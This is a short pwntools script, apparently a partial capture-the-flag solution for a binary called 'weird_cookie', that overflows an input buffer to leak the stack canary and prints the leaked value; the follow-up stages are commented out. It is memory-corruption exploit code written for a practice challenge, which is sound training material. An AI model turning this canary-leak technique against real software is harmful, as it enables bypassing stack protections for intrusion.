#!/usr/bin/python3

from pwn import *

p = process('./weird_cookie')
# p = remote('challenge.nahamcon.com', 31282)

p.recvuntil(b"Do you think you can overflow me?")
p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

p.recvline()
p.recvline()

canary = u64(p.recvline().rstrip()[:-1])
info("Leaked canary value :: " + hex(canary))

# p.recvuntil(b"Are you sure you overflowed it right? Try again.")
# p.sendline(b"test")

# p.interactive()
# print(p.recv())